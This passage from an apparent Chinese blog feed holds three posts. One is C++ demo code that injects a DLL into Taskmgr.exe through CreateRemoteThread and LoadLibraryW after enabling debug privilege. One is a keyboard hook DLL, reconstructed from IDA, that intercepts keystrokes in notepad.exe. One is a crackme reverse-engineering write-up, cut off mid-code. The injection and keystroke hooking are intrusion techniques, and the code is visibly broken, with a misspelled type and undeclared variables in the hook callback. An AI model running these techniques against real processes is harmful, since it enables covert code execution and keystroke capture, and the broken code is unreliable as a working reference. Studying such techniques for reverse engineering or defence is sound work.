class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">BOOL <span class="hljs-title">SeEnableSeDebugPrivilege</span><span class="hljs-params">(IN <span class="hljs-type">const</span> TCHAR* PriviledgeName, BOOL IsEnable)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">SeInjectDll</span><span class="hljs-params">(DWORD ProcessIdentify, LPCTSTR DllPath)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">SeEjectDll</span><span class="hljs-params">(DWORD ProcessIdentify, LPCTSTR DllPath)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">SeGetProcessIdentify</span><span class="hljs-params">(HANDLE* ProcessIdentify,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG_PTR ProcessIdentifyLength, <span class="hljs-type">const</span> TCHAR* ImageName, ULONG_PTR ImageNameLength)</span></span>;<br><br><span class="hljs-number">2</span>)_tmain.cpp<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;_tmain.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br><br><span class="hljs-built_in">SeEnableSeDebugPrivilege</span>(SE_DEBUG_NAME, TRUE);<br><br>HANDLE ProcessIdentify = <span class="hljs-number">0</span>;<br><br>TCHAR ImageName[MAX_PATH] = &#123; _T(<span class="hljs-string">&quot;Taskmgr.exe&quot;</span>) &#125;;<br><br><span class="hljs-built_in">SeGetProcessIdentify</span>((PHANDLE)&amp;ProcessIdentify, <span class="hljs-built_in">sizeof</span>(HANDLE),<br>ImageName, MAX_PATH * <span class="hljs-built_in">sizeof</span>(TCHAR));<br><br>TCHAR DllFullPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetCurrentDirectory</span>(MAX_PATH, DllFullPath);<br><br>_tcscat_s(DllFullPath, _T(<span class="hljs-string">&quot;\\Dll.dll&quot;</span>));<br><br><span class="hljs-built_in">SeInjectDll</span>((DWORD)ProcessIdentify, DllFullPath);<br><br>_tprintf(_T(<span class="hljs-string">&quot;Input AnyKey To Exit\r\n&quot;</span>));<br>_gettchar();<br><span class="hljs-built_in">SeEjectDll</span>((DWORD)ProcessIdentify, DllFullPath);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">SeEnableSeDebugPrivilege</span><span class="hljs-params">(IN <span class="hljs-type">const</span> TCHAR* PriviledgeName, BOOL IsEnable)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 打开权限令牌</span><br>HANDLE  ProcessHandle = <span class="hljs-built_in">GetCurrentProcess</span>();<br>HANDLE  TokenHandle = <span class="hljs-literal">NULL</span>;<br>TOKEN_PRIVILEGES TokenPrivileges = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(ProcessHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>LUOID  v1;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, PriviledgeName, &amp;v1))<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br>TokenHandle = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>TokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>TokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = IsEnable == TRUE ? SE_PRIVILEGE_ENABLED : <span class="hljs-number">0</span>;<br>TokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = v1;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(TokenHandle, FALSE, &amp;TokenPrivileges,<br><span class="hljs-built_in">sizeof</span>(TOKEN_PRIVILEGES), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;LastError:%d\r\n&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br>TokenHandle = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br>TokenHandle = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SeInjectDll</span><span class="hljs-params">(DWORD ProcessIdentify, LPCTSTR DllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE ProcessHandle, ThreadHandle;<br>LPVOID VirtualAddress;<br>DWORD ViewSize = (DWORD)(_tcslen(DllPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(TCHAR);<br>LPTHREAD_START_ROUTINE ThreadStartRoutine = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (!(ProcessHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessIdentify)))<br>&#123;<br>DWORD LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>VirtualAddress = <span class="hljs-built_in">VirtualAllocEx</span>(ProcessHandle, <span class="hljs-literal">NULL</span>, ViewSize, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(ProcessHandle, VirtualAddress, (LPVOID)DllPath, ViewSize, <span class="hljs-literal">NULL</span>);<br><br>ThreadStartRoutine = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>ThreadHandle = <span class="hljs-built_in">CreateRemoteThread</span>(ProcessHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadStartRoutine, VirtualAddress, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">WaitForSingleObject</span>(ThreadHandle, INFINITE);<br><br><span class="hljs-built_in">CloseHandle</span>(ThreadHandle);<br><br><span class="hljs-built_in">CloseHandle</span>(ProcessHandle);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SeEjectDll</span><span class="hljs-params">(DWORD ProcessIdentify, LPCTSTR DllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL IsOk = FALSE, IsFound = FALSE;<br>HANDLE SnapshotHandle, ProcessHandle, ThreadHandle;<br>MODULEENTRY32 ModuleEntry32 = &#123; <span class="hljs-built_in">sizeof</span>(ModuleEntry32) &#125;;<br>LPTHREAD_START_ROUTINE ThreadStartRoutine = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == (SnapshotHandle = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, ProcessIdentify)))<br><span class="hljs-keyword">return</span> FALSE;<br><br>IsOk = <span class="hljs-built_in">Module32First</span>(SnapshotHandle, &amp;ModuleEntry32);<br><span class="hljs-keyword">for</span> (; IsOk; IsOk = <span class="hljs-built_in">Module32Next</span>(SnapshotHandle, &amp;ModuleEntry32))<br>&#123;<br><span class="hljs-keyword">if</span> (!_tcsicmp(ModuleEntry32.szModule, DllPath) || !_tcsicmp(ModuleEntry32.szExePath, DllPath))<br>&#123;<br>IsFound = TRUE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!IsFound)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(SnapshotHandle);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!(ProcessHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessIdentify)))<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(SnapshotHandle);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>ThreadStartRoutine = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <span class="hljs-string">&quot;FreeLibrary&quot;</span>);<br><br>ThreadHandle = <span class="hljs-built_in">CreateRemoteThread</span>(ProcessHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadStartRoutine, ModuleEntry32.modBaseAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">WaitForSingleObject</span>(ThreadHandle, INFINITE);<br><br><span class="hljs-built_in">CloseHandle</span>(ThreadHandle);<br><span class="hljs-built_in">CloseHandle</span>(ProcessHandle);<br><span class="hljs-built_in">CloseHandle</span>(SnapshotHandle);<br><br><span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SeGetProcessIdentify</span><span class="hljs-params">(HANDLE* ProcessIdentify,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG_PTR ProcessIdentifyLength, <span class="hljs-type">const</span> TCHAR* ImageName, ULONG_PTR ImageNameLength)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL IsOk = FALSE;<br>HANDLE SnapshotHandle = INVALID_HANDLE_VALUE;<br>PROCESSENTRY32 ProcessEntry32;<br>ProcessEntry32.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><span class="hljs-type">int</span> LastError = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsBadWritePtr</span>(ProcessIdentify, ProcessIdentifyLength) ||<br><span class="hljs-built_in">IsBadReadPtr</span>(ImageName, ImageNameLength))<br>&#123;<br><br>LastError = ERROR_INVALID_PARAMETER;<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br>SnapshotHandle = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (SnapshotHandle == INVALID_HANDLE_VALUE)<br>&#123;<br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(SnapshotHandle, &amp;ProcessEntry32))<br>&#123;<br><br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br><br><span class="hljs-keyword">do</span><br>&#123;<br><br><span class="hljs-keyword">if</span> (_tcsicmp(ProcessEntry32.szExeFile, ImageName) == <span class="hljs-number">0</span>)<br>&#123;<br><br>*ProcessIdentify = (HANDLE)ProcessEntry32.th32ProcessID;<br>IsOk = TRUE;<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(SnapshotHandle, &amp;ProcessEntry32));<br><br><br><br>LastError = ERROR_MOD_NOT_FOUND;<br><br>Exit:<br><br><span class="hljs-keyword">if</span> (SnapshotHandle != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(SnapshotHandle);<br>&#125;<br>SnapshotHandle = INVALID_HANDLE_VALUE;<br><span class="hljs-built_in">SetLastError</span>(LastError);<br><span class="hljs-keyword">return</span> IsOk;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HOOK集合</category>
      
      <category>Demo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HOOK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>键盘过滤</title>
    <link href="/project/2023/01/26/%E9%94%AE%E7%9B%98%E8%BF%87%E6%BB%A4/"/>
    <url>/project/2023/01/26/%E9%94%AE%E7%9B%98%E8%BF%87%E6%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>代码具体分为两部分<br>1.KeyHook 动态链接库<br>2.HookMain    主程序入口</p><span id="more"></span><p>1.KeyHook 动态链接库<br>DllMain.cpp<br>Source.def</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//DllMain.cpp   </span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br>   <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>   HINSTANCE __ModuleHandle = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">//模块句柄（基地址）</span><br>   HHOOK  __HookModule = <span class="hljs-literal">NULL</span>;       <span class="hljs-comment">//钩子句柄（基地址）</span><br>   <span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">MessageProcedure</span><span class="hljs-params">(<span class="hljs-type">int</span> Message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"><span class="hljs-comment">//DllMain 的规范写法 注意程序位数 钩子程序位数需要和所需钩的程序或系统的位数相匹配</span></span><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD ul_reason_for_call, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br>__ModuleHandle = hinstDLL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">//IDA Export 中发现的导出函数 HookStart</span><br><span class="hljs-function">HHOOK <span class="hljs-title">SetWindowsHookEx</span><span class="hljs-params">(      </span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">int</span> idHook,      <span class="hljs-comment">//消息ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">    HOOKPROC lpfn,   <span class="hljs-comment">//回调函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">    HINSTANCE hMod,  <span class="hljs-comment">//模块句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD dwThreadId <span class="hljs-comment">//线程ID 一般为0</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function">HHOOK <span class="hljs-title">HookStart</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HHOOK ReturnValue; <span class="hljs-comment">// eax</span><br><br>ReturnValue = <span class="hljs-built_in">SetWindowsHookEx</span>(<span class="hljs-number">2</span>, MessageProcedure, __ModuleHandle, <span class="hljs-number">0</span>);  <span class="hljs-comment">//系统黑函数</span><br>__HookModule = ReturnValue;  <span class="hljs-comment">//拦截成功 返回一个钩子钩取的句柄 </span><br><span class="hljs-keyword">return</span> ReturnValue;<br>&#125;<br><br><span class="hljs-comment">//SetWindowsHookEx函数的回调函数 MessageProcedure</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">MessageProcedure</span><span class="hljs-params">(<span class="hljs-type">int</span> Message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>TCHAR v1[<span class="hljs-number">260</span>] = &#123; <span class="hljs-number">0</span> &#125;; <span class="hljs-comment">// 文件的完整路径</span><br> TCHAR v2[<span class="hljs-number">50</span>] = &#123; <span class="hljs-number">0</span> &#125;; <span class="hljs-comment">//按键文本</span><br>TCHAR* v3; <span class="hljs-comment">// 游走指针</span><br><span class="hljs-built_in">memset</span>(&amp;v1, <span class="hljs-number">0</span>, <span class="hljs-number">260</span>);  <span class="hljs-comment">//初始化</span><br><br><span class="hljs-keyword">if</span> (Message &gt;= <span class="hljs-number">0</span><br>&amp;&amp; ParamemterData2 &gt;= <span class="hljs-number">0</span><br>&amp;&amp; (<span class="hljs-built_in">GetModuleFileName</span>(<span class="hljs-number">0</span>,v1,<span class="hljs-number">260</span>), v3 = _tcsrchr(v1, <span class="hljs-number">92</span>), !_tcsicmp(v3 + <span class="hljs-number">1</span>, _T(<span class="hljs-string">&quot;notepad.exe&quot;</span>))))<br>&#123;<br><span class="hljs-built_in">GetKeyNameText</span>(ParamemterData2, v2, <span class="hljs-number">50</span>);<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, v2, _T(<span class="hljs-string">&quot;Filter&quot;</span>), <span class="hljs-number">0</span>);<br>ResultValue = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//不做拦截</span><br>ResultValue = <span class="hljs-built_in">CallNextHookEx</span>(<span class="hljs-literal">NULL</span>, Message, ParameterData1, ParamemterData2);<br>&#125;<br><span class="hljs-keyword">return</span> ResultValue;<br>&#125;<br><br><span class="hljs-comment">//IDA Export 中发现的导出函数 HookStop</span><br><span class="hljs-function">HHOOK <span class="hljs-title">HookStop</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HHOOK ReturnValue; <span class="hljs-comment">// eax</span><br><br>ReturnValue = __HookModule;<br><span class="hljs-keyword">if</span> (__HookModule)<br>&#123;<br>ReturnValue = (HHOOK)<span class="hljs-built_in">UnhookWindowsHookEx</span>(__HookModule);<br>__HookModule = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ReturnValue;<br>&#125;<br><span class="hljs-comment">//Source.def  资源文件(导出表)</span><br> EXPORTS<br>HookStart @<span class="hljs-number">1</span><br>HookStop  @<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>2.HookMain主程序入口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//_tmain.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span>  <span class="hljs-params">(_cdecl *LPFN_SUB)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;  <span class="hljs-comment">//函数指针</span><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>HMODULE ModuleHandle; <span class="hljs-comment">// eax@1 模块句柄（基地址）</span><br>DWORD v5; <span class="hljs-comment">// eax@2  报错</span><br><span class="hljs-type">int</span> ResultValue; <span class="hljs-comment">// eax@2</span><br><span class="hljs-comment">//void(*v7)(void); </span><br><span class="hljs-comment">//void(*v8)(void); </span><br>LPFN_SUB v7 = <span class="hljs-literal">NULL</span>;<br>LPFN_SUB v8 = <span class="hljs-literal">NULL</span>;<br><br>ModuleHandle = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;HookKey.dll&quot;</span>);  <span class="hljs-comment">//加载模块的句柄</span><br><span class="hljs-keyword">if</span> (ModuleHandle)<br>&#123;<br>v7 = (<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>))<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, <span class="hljs-string">&quot;HookStart&quot;</span>);<br>v8 = (<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>))<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, <span class="hljs-string">&quot;HookStop&quot;</span>);<br><span class="hljs-built_in">v7</span>();<br>_tprintf(_T(<span class="hljs-string">&quot;press &#x27;q&#x27; to quit!\n&quot;</span>));<br><span class="hljs-keyword">while</span> (_gettchar() != <span class="hljs-number">113</span>)<br>&#123;<br><br>&#125;<br><span class="hljs-built_in">v8</span>();<br><span class="hljs-built_in">FreeLibrary</span>(ModuleHandle); <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>v5 = <span class="hljs-built_in">GetLastError</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HOOK集合</category>
      
      <category>Demo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HOOK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malware34</title>
    <link href="/project/2022/12/27/Malware34/"/>
    <url>/project/2022/12/27/Malware34/</url>
    
    <content type="html"><![CDATA[<p>一个无壳但需要创建新文件并在新文件进行读写操作获取加密的逆向分析样本</p><span id="more"></span><p>环境：虚拟机-&gt;操作系统：Windows10 Pro<br>比较简单<br> 拖入PEid中 无壳<br> 拖入辣椒中 32位<br> 拖入IDA中 样本分析<br>1、上来直接定位到函数入口</p><p>2、创建文件句柄 下面出现ReadFile 初步确定该程序需要打开名为CRACKME3.KEY文件，并读取文件内容</p><p>3、0401066 cmp     ds:NumberOfBytesRead, 18 读取文件后 将文件长度与18进行比较 </p><p>4、未输入18及以上字符时，0040106D jnz     short loc_401037 跳转指令</p><p>5、0040106F: push    offset unk_402008     传入文件内容<br>   00401074: call    sub_401311            f7步入函数内部</p><p>6、剩余逆向测试在下方Test.cpp中 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//Test.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;IOSTREAM&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WINDOWS.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TCHAR.H&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> __dword_4020F9 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> __dword_402149 = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> _tmain()<br>&#123;<br><br><span class="hljs-type">char</span> v1[] = <span class="hljs-string">&quot;111111111111111111&quot;</span>;<br><span class="hljs-type">char</span> v3[] = <span class="hljs-string">&quot;111111111111111111&quot;</span>;<br><span class="hljs-type">char</span> v2 = <span class="hljs-number">0x41</span>;<br><br><span class="hljs-type">char</span>* v5 = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (v1[i] != <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; v2 != <span class="hljs-number">0x4F</span>)<br>&#123;<br>v1[i] = v1[i] ^ v2++;<br><br>__dword_4020F9 += v1[i];<br><br>i++;<br><br>&#125;<br><br>__dword_402149 = i;<br><br>__dword_4020F9 = __dword_4020F9 ^ <span class="hljs-number">0x12345678</span>;<br><br><br>v5 = &amp;v1[<span class="hljs-number">0xE</span>];<br><br>HANDLE FileHandle = INVALID_HANDLE_VALUE;<br>FileHandle = <span class="hljs-built_in">CreateFile</span>(<span class="hljs-string">L&quot;CRACKME3.KEY&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">//win11 运行时，需要在FileShareMode处增加权限 否则创建文件句柄时，会提示违背共享</span><br><span class="hljs-keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>DWORD ReturnLength = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">WriteFile</span>(FileHandle, v3, <span class="hljs-number">0xE</span>, &amp;ReturnLength, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">WriteFile</span>(FileHandle, (<span 